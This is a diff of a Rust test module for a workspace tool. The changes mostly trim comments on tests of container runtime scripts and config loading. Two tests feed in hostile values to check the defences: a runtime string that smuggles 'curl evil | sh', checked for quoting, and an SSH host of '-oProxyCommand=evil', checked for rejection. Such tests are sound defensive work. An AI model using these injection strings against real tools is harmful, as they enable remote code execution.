             Some("podman compose ps -q | wc -l")
         );
-        // Destroy-time only — reaps the worktree's ws-namespaced volumes.
         assert_eq!(
             default_script("podman", "post-remove").as_deref(),
             Some("podman compose down -v")
         );
-        // No generic "set this project up" step.
         assert_eq!(default_script("podman", "post-create"), None);
         assert_eq!(default_script("podman", "nonsense"), None);
     }
 
     #[test]
     fn default_script_quotes_a_hostile_runtime() {
-        // `runtime` comes from a possibly-cloned `.ws.json` and these run via `sh -c`.
         let s = default_script("podman; curl evil | sh #", "down").unwrap();
         assert!(s.starts_with("'podman; curl evil | sh #' compose down"), "{s}");
     }
@@ -704,8 +503,6 @@ mod tests {
 
     #[test]
     fn load_refuses_a_publish_address_that_isnt_an_address() {
-        // Checked at load, not at first use, so a typo doesn't lie dormant until
-        // the one command that brings routing up.
         for bad in ["localhost", "1.2.3.4:8443", "0.0.0.0/0", "not-an-ip", "224.0.0.1"] {
             let dir = tempfile::tempdir().unwrap();
             write_cfg(
@@ -755,8 +552,7 @@ mod tests {
         .unwrap();
         let cfg = load(dir.path()).unwrap();
         assert_eq!(cfg.domain.as_deref(), Some("myapp.test"));
-        // runtime absent on a *remote* workspace → the fallback, never this
-        // machine's PATH (see `an_absent_runtime_detects_locally_but_not_remotely`).
+        // Runtime absent on a remote workspace → the fallback, never this machine's PATH.
         assert_eq!(cfg.runtime(), "podman");
         let remote = cfg.remote.expect("remote block");
         assert_eq!(remote.connection, "srv");
@@ -765,8 +561,7 @@ mod tests {
 
     #[test]
     fn load_rejects_an_option_shaped_remote_connection() {
-        // A hostile `.ws.json` (not gitignored → can arrive via a clone) with a
-        // connection ssh would parse as an option must be refused at load.
+        // A hostile `.ws.json` can arrive via a clone (not gitignored).
         let dir = tempfile::tempdir().unwrap();
         std::fs::write(
             dir.path().join(".ws.json"),
@@ -787,8 +582,7 @@ mod tests {
         assert_eq!(load(dir.path()).unwrap().runtime(), "docker");
     }
 
-    /// Detection order is a contract, not an accident: a box with both installed
-    /// gets docker.
+    /// Detection order is a contract: a box with both installed gets docker.
     #[test]
     fn detection_prefers_docker() {
         assert_eq!(RUNTIMES, ["docker", "podman"]);
@@ -797,9 +591,7 @@ mod tests {
         }
     }
 
-    /// An absent `runtime` resolves against **this machine's** PATH — which says
-    /// nothing about an offload server, so a remote workspace keeps the fallback
-    /// instead of assuming the client's answer applies there.
+    /// An absent `runtime` resolves against this machine's PATH — meaningless for an offload server, so a remote workspace keeps the fallback.
     #[test]
     fn an_absent_runtime_detects_locally_but_not_remotely() {
         let dir = tempfile::tempdir().unwrap();
@@ -812,9 +604,7 @@ mod tests {
         assert_eq!(load(dir.path()).unwrap().runtime(), "podman");
     }
 
-    /// A missing runtime is named, and the two cases give different advice: a box
-    /// with nothing installed needs an install, a pin naming an absent binary
-    /// needs the pin changed.
+    /// The two failure cases give different advice: nothing installed → install; a pin naming an absent binary → change the pin.
     #[test]
     fn ensure_available_explains_which_kind_of_missing_it_is() {
         let err = ensure_available("definitely-not-a-runtime").unwrap_err().to_string();
@@ -825,9 +615,7 @@ mod tests {
             }
             None => assert!(err.contains("no container runtime found"), "{err}"),
         }
-        // A present binary passes. `git` stands in for a runtime: which container
-        // runtimes exist is exactly the CI variable this test can't pin down, and
-        // `git` is already a hard requirement of every `ws` command.
+        // `git` stands in for a present binary — which runtimes exist is exactly the CI variable this test can't pin down, and `git` is a hard requirement of every `ws` command.
         assert!(ensure_available("git").is_ok());
     }
 
@@ -872,7 +660,6 @@ mod tests {
         )
         .unwrap();
         let cfg = load(dir.path()).unwrap();
-        // Bare-name entry stays valid and carries no extended config.
         assert_eq!(cfg.repos[0].name(), "web");
         assert!(cfg.repos[0].config().is_none());
         let app = &cfg.repos[1].config().unwrap().services["app"];
@@ -887,25 +674,20 @@ mod tests {
         g.set("remote.host", "srv").unwrap();
         assert_eq!(g.get("remote.host").unwrap(), Some("srv"));
 
-        // Serialize → parse round-trips the value (the on-disk TOML shape).
         let toml_s = toml::to_string_pretty(&g).unwrap();
         assert!(toml_s.contains("[remote]") && toml_s.contains("host = \"srv\""));
         let back: GlobalConfig = toml::from_str(&toml_s).unwrap();
         assert_eq!(back.remote_host(), Some("srv"));
 
-        // A typo'd hand-edit must refuse at parse, not read as unset — `save`
-        // rewrites the whole file, so a silently-ignored key would be silently
-        // dropped by the next `ws config set`.
+        // A typo'd hand-edit must refuse at parse — `save` rewrites the whole file, so a silently-ignored key would be silently dropped by the next `ws config set`.
         let e = toml::from_str::<GlobalConfig>("[remote]\nhosst = \"x\"\n")
             .map(|_| ())
             .expect_err("unknown TOML key must be refused");
         assert!(e.to_string().contains("hosst"), "{e}");
 
-        // Unset reports it was set, and prunes the emptied [remote] section.
         assert!(g.unset("remote.host").unwrap());
         assert!(g.remote.is_none(), "emptied section must be pruned");
         assert_eq!(toml::to_string_pretty(&g).unwrap(), "");
-        // Unsetting again is a no-op, not an error.
         assert!(!g.unset("remote.host").unwrap());
     }
 
@@ -920,16 +702,14 @@ mod tests {
             let e = r.expect_err("unknown key must be refused");
             assert!(e.to_string().contains("known keys"), "{e}");
         }
-        // The host lands in ssh argv later — option-shaped values are refused at
-        // set time (same posture as config::load's connection guard).
+        // The host lands in ssh argv later — option-shaped values must be refused at set time.
         let e = g.set("remote.host", "-oProxyCommand=evil").expect_err("unsafe host");
         assert!(e.to_string().contains("unsafe SSH host"), "{e}");
     }
 
     #[test]
     fn global_keys_and_accessor_arms_stay_in_sync() {
-        // GLOBAL_KEYS only feeds error text; this walk keeps it honest against
-        // the match arms — a key listed but unhandled (or vice versa) fails here.
+        // GLOBAL_KEYS only feeds error text; this walk catches drift against the match arms.
         let mut g = GlobalConfig::default();
         for key in GLOBAL_KEYS {
             g.set(key, "some-value").unwrap_or_else(|e| panic!("set {key}: {e}"));
